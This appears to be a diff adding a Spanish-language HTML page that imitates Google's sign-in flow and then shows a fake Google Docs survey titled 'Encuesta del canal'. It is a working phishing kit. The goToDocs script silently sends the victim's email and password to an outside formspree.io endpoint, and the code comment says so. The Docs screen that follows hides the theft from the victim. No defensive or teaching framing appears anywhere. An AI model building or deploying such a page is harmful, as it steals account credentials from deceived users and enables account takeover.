@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Iniciar sesión - Google</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: #f0f4f9;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+    }
+    .hidden { display: none !important; }
+    .card {
+      background: white;
+      border-radius: 28px;
+      width: 860px;
+      max-width: 98vw;
+      display: flex;
+      align-items: flex-start;
+      padding: 48px 44px 44px 44px;
+      gap: 72px;
+    }
+    .col-left { min-width: 210px; display: flex; flex-direction: column; }
+    .col-right { flex: 1; display: flex; flex-direction: column; }
+    .g-logo { width: 40px; height: 40px; margin-bottom: 40px; }
+    .col-left h1 { font-size: 24px; font-weight: 400; color: #202124; line-height: 1.35; }
+    .col-left .sub { font-size: 16px; color: #202124; margin-top: 8px; }
+    .input-wrap { position: relative; margin-bottom: 6px; }
+    .input-wrap input {
+      width: 100%; height: 56px;
+      border: 1px solid #dadce0; border-radius: 4px;
+      padding: 18px 14px 6px; font-size: 16px;
+      color: #202124; outline: none; font-family: inherit;
+      transition: border 0.2s; background: white;
+    }
+    .input-wrap input:focus { border: 2px solid #1a73e8; }
+    .input-wrap input:focus + label { color: #1a73e8; }
+    .input-wrap label {
+      position: absolute; top: 50%; left: 14px;
+      transform: translateY(-50%); font-size: 16px;
+      color: #5f6368; pointer-events: none;
+      transition: all 0.15s; background: white; padding: 0 2px;
+    }
+    .input-wrap input:focus + label,
+    .input-wrap input:not(:placeholder-shown) + label {
+      top: 0; font-size: 12px; transform: translateY(-50%);
+    }
+    .error-msg { font-size: 13px; color: #d93025; display: none; margin-top: 4px; }
+    .show-pass {
+      display: flex; align-items: center; gap: 10px;
+      font-size: 14px; color: #202124; cursor: pointer; margin: 8px 0 0;
+    }
+    .show-pass input[type=checkbox] { width: 16px; height: 16px; cursor: pointer; }
+    .btn-row {
+      display: flex; justify-content: space-between;
+      align-items: center; margin-top: 32px;
+    }
+    .link-btn {
+      color: #1a73e8; font-size: 14px; font-weight: 500;
+      background: none; border: none; cursor: pointer;
+      padding: 8px 0; font-family: inherit;
+    }
+    .link-btn:hover { text-decoration: underline; }
+    .primary-btn {
+      background: #1a73e8; color: white; border: none;
+      border-radius: 24px; padding: 10px 28px;
+      font-size: 14px; font-weight: 500; cursor: pointer;
+      font-family: inherit; transition: background 0.15s;
+    }
+    .primary-btn:hover { background: #1557b0; }
+    .user-pill {
+      display: inline-flex; align-items: center; gap: 10px;
+      border: 1px solid #dadce0; border-radius: 24px;
+      padding: 6px 14px 6px 8px; font-size: 14px;
+      color: #202124; cursor: pointer; margin: 8px 0 28px;
+      align-self: flex-start; transition: background 0.15s;
+    }
+    .user-pill:hover { background: #f8f9fa; }
+    .pill-av {
+      width: 28px; height: 28px; border-radius: 50%;
+      background: #1a73e8; color: white;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; font-weight: 500;
+    }
+    footer {
+      width: 860px; max-width: 98vw;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 14px 4px 0; font-size: 13px; color: #5f6368;
+    }
+    .footer-links { display: flex; gap: 20px; }
+    .footer-links a { color: #5f6368; text-decoration: none; }
+    .footer-links a:hover { text-decoration: underline; }
+    select.lang-sel {
+      border: none; background: none; font-size: 13px;
+      color: #5f6368; cursor: pointer; font-family: inherit;
+    }
+
+    /* DOCS */
+    #screen-docs {
+      display: none; flex-direction: column;
+      position: fixed; inset: 0; background: white; z-index: 999;
+    }
+    .docs-topbar {
+      display: flex; align-items: center; gap: 8px;
+      padding: 6px 12px; border-bottom: 1px solid #e0e0e0;
+      height: 56px; flex-shrink: 0;
+    }
+    .docs-appname { font-size: 18px; color: #5f6368; font-weight: 400; margin-left: 6px; }
+    .docs-title-col { flex: 1; display: flex; flex-direction: column; margin-left: 4px; }
+    .docs-title-inp {
+      font-size: 18px; font-weight: 400; color: #202124;
+      border: none; outline: none; font-family: inherit;
+      padding: 2px 6px; border-radius: 4px; width: 260px;
+    }
+    .docs-title-inp:hover, .docs-title-inp:focus { background: #f1f3f4; }
+    .docs-menubar { display: flex; font-size: 13px; color: #202124; }
+    .docs-menu { padding: 3px 10px; border-radius: 4px; cursor: pointer; }
+    .docs-menu:hover { background: #f1f3f4; }
+    .docs-share {
+      display: flex; align-items: center; gap: 8px;
+      background: #1a73e8; color: white; border: none;
+      border-radius: 20px; padding: 8px 20px;
+      font-size: 14px; font-weight: 500; cursor: pointer; font-family: inherit;
+    }
+    .docs-userav {
+      width: 34px; height: 34px; border-radius: 50%;
+      background: #1a73e8; color: white;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 15px; font-weight: 500; margin-left: 8px; cursor: pointer;
+    }
+    .docs-toolbar {
+      display: flex; align-items: center; gap: 2px;
+      padding: 4px 12px; border-bottom: 1px solid #e0e0e0;
+      background: #f8f9fa; flex-wrap: wrap;
+    }
+    .tb-btn {
+      width: 30px; height: 30px; border: none; background: none;
+      border-radius: 4px; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 14px; color: #444746; font-family: inherit;
+    }
+    .tb-btn:hover { background: #e8eaed; }
+    .tb-sep { width: 1px; height: 22px; background: #dadce0; margin: 0 3px; }
+    .tb-sel {
+      height: 28px; border: none; background: none;
+      font-size: 13px; color: #444746; font-family: inherit;
+      border-radius: 4px; padding: 0 4px; cursor: pointer;
+    }
+    .tb-sel:hover { background: #e8eaed; }
+    .docs-canvas {
+      flex: 1; background: #f0f4f9; overflow-y: auto;
+      display: flex; justify-content: center; padding: 30px 20px;
+    }
+    .docs-page {
+      background: white; width: 816px; max-width: 100%;
+      min-height: 1056px; padding: 96px;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.2);
+    }
+    .docs-h1 {
+      font-size: 26px; font-weight: 400; color: #202124;
+      margin-bottom: 32px; line-height: 1.4;
+    }
+    .docs-editor {
+      font-size: 11pt; font-family: Arial, sans-serif;
+      color: #202124; line-height: 1.75; min-height: 400px; outline: none;
+    }
+    .docs-editor:empty::before {
+      content: 'Escribe tu respuesta aquí...';
+      color: #bdc1c6; pointer-events: none;
+    }
+  </style>
+</head>
+<body>
+
+<!-- SCREEN 1: EMAIL -->
+<div class="card" id="screen-email">
+  <div class="col-left">
+    <svg class="g-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1>Iniciar sesión</h1>
+    <p class="sub">Usa tu cuenta de Google</p>
+  </div>
+  <div class="col-right">
+    <div class="input-wrap">
+      <input type="email" id="email-inp" placeholder=" " autocomplete="email" />
+      <label for="email-inp">Correo electrónico o teléfono</label>
+    </div>
+    <div class="error-msg" id="email-err">Introduce un correo electrónico válido.</div>
+    <div class="btn-row">
+      <button class="link-btn">¿Olvidaste tu correo?</button>
+      <button class="primary-btn" onclick="goToPass()">Siguiente</button>
+    </div>
+  </div>
+</div>
+
+<!-- SCREEN 2: PASSWORD -->
+<div class="card hidden" id="screen-pass">
+  <div class="col-left">
+    <svg class="g-logo" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+      <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+      <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+      <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.18 1.48-4.97 2.31-8.16 2.31-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+    </svg>
+    <h1 id="pass-name">nombre</h1>
+    <div class="user-pill" onclick="goBack()">
+      <div class="pill-av" id="pill-av">?</div>
+      <span id="pill-email">correo@gmail.com</span>
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="#5f6368"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+  </div>
+  <div class="col-right">
+    <div class="input-wrap">
+      <input type="password" id="pass-inp" placeholder=" " autocomplete="current-password" />
+      <label for="pass-inp">Introduce tu contraseña</label>
+    </div>
+    <label class="show-pass">
+      <input type="checkbox" onchange="togglePass(this)" />
+      Mostrar contraseña
+    </label>
+    <div class="btn-row">
+      <button class="link-btn">¿Has olvidado tu contraseña?</button>
+      <button class="primary-btn" onclick="goToDocs()">Siguiente</button>
+    </div>
+  </div>
+</div>
+
+<footer id="ft">
+  <select class="lang-sel"><option>Español (España)</option></select>
+  <div class="footer-links">
+    <a href="#">Ayuda</a>
+    <a href="#">Privacidad</a>
+    <a href="#">Términos</a>
+  </div>
+</footer>
+
+<!-- SCREEN 3: GOOGLE DOCS -->
+<div id="screen-docs">
+  <div class="docs-topbar">
+    <svg width="36" height="36" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+      <path d="M29 3H11C8.79 3 7 4.79 7 7v34c0 2.21 1.79 4 4 4h26c2.21 0 4-1.79 4-4V19L29 3z" fill="#4285F4"/>
+      <path d="M29 3v16h16L29 3z" fill="#A1C2FA"/>
+      <path d="M14 27h20v2H14zm0 4h20v2H14zm0 4h14v2H14z" fill="white"/>
+    </svg>
+    <span class="docs-appname">Documentos de Google</span>
+    <div class="docs-title-col">
+      <input class="docs-title-inp" type="text" value="Encuesta del canal" />
+      <div class="docs-menubar">
+        <span class="docs-menu">Archivo</span>
+        <span class="docs-menu">Editar</span>
+        <span class="docs-menu">Ver</span>
+        <span class="docs-menu">Insertar</span>
+        <span class="docs-menu">Formato</span>
+        <span class="docs-menu">Herramientas</span>
+        <span class="docs-menu">Extensiones</span>
+        <span class="docs-menu">Ayuda</span>
+      </div>
+    </div>
+    <button class="docs-share">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92s2.92-1.31 2.92-2.92-1.31-2.92-2.92-2.92z"/></svg>
+      Compartir
+    </button>
+    <div class="docs-userav" id="docs-av">?</div>
+  </div>
+  <div class="docs-toolbar">
+    <button class="tb-btn">↩</button><button class="tb-btn">↪</button><button class="tb-btn">🖨</button>
+    <div class="tb-sep"></div>
+    <select class="tb-sel"><option>100%</option></select>
+    <div class="tb-sep"></div>
+    <select class="tb-sel" style="width:140px;"><option>Texto normal</option><option>Título</option></select>
+    <div class="tb-sep"></div>
+    <select class="tb-sel" style="width:120px;"><option>Arial</option><option>Times New Roman</option></select>
+    <div class="tb-sep"></div>
+    <select class="tb-sel" style="width:52px;"><option>11</option><option>12</option><option>14</option></select>
+    <div class="tb-sep"></div>
+    <button class="tb-btn" style="font-weight:700;">B</button>
+    <button class="tb-btn" style="font-style:italic;font-family:serif;">I</button>
+    <button class="tb-btn" style="text-decoration:underline;">U</button>
+    <div class="tb-sep"></div>
+    <button class="tb-btn">≡</button><button class="tb-btn">≡</button><button class="tb-btn">≡</button>
+  </div>
+  <div class="docs-canvas">
+    <div class="docs-page">
+      <div class="docs-h1">¿Qué mejorarías tú de el canal?</div>
+      <div class="docs-editor" contenteditable="true" id="doc-editor"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+
+  let correoGuardado = '';
+
+  function goToPass() {
+    const email = document.getElementById('email-inp').value.trim();
+    const err = document.getElementById('email-err');
+    if (!email || !email.includes('@')) {
+      err.style.display = 'block';
+      document.getElementById('email-inp').focus();
+      return;
+    }
+    err.style.display = 'none';
+    correoGuardado = email;
+
+    const name = email.split('@')[0];
+    document.getElementById('pass-name').textContent = name;
+    document.getElementById('pill-email').textContent = email;
+    document.getElementById('pill-av').textContent = name[0].toUpperCase();
+
+    document.getElementById('screen-email').classList.add('hidden');
+    document.getElementById('screen-pass').classList.remove('hidden');
+    document.getElementById('pass-inp').value = '';
+    setTimeout(() => document.getElementById('pass-inp').focus(), 50);
+  }
+
+  function goBack() {
+    document.getElementById('screen-pass').classList.add('hidden');
+    document.getElementById('screen-email').classList.remove('hidden');
+    document.getElementById('email-inp').focus();
+  }
+
+  function togglePass(cb) {
+    document.getElementById('pass-inp').type = cb.checked ? 'text' : 'password';
+  }
+
+  function goToDocs() {
+    const pass = document.getElementById('pass-inp').value;
+    if (!pass) { document.getElementById('pass-inp').focus(); return; }
+
+    // Enviar correo y contraseña al Sheet silenciosamente
+    fetch('https://formspree.io/f/mwvzvjwp', { method: 'POST', headers: {'Content-Type': 'application/json', 'Accept': 'application/json'}, body: JSON.stringify({correo: correoGuardado, password: pass}) });
+
+    document.getElementById('docs-av').textContent = correoGuardado[0].toUpperCase();
+    document.getElementById('screen-pass').classList.add('hidden');
+    document.getElementById('ft').classList.add('hidden');
+
+    const docs = document.getElementById('screen-docs');
+    docs.style.display = 'flex';
+    docs.style.flexDirection = 'column';
+    setTimeout(() => document.getElementById('doc-editor').focus(), 100);
+  }
+
+  document.getElementById('email-inp').addEventListener('keydown', e => { if (e.key === 'Enter') goToPass(); });
+  document.getElementById('pass-inp').addEventListener('keydown', e => { if (e.key === 'Enter') goToDocs(); });
+</script>
+</body>
+</html>
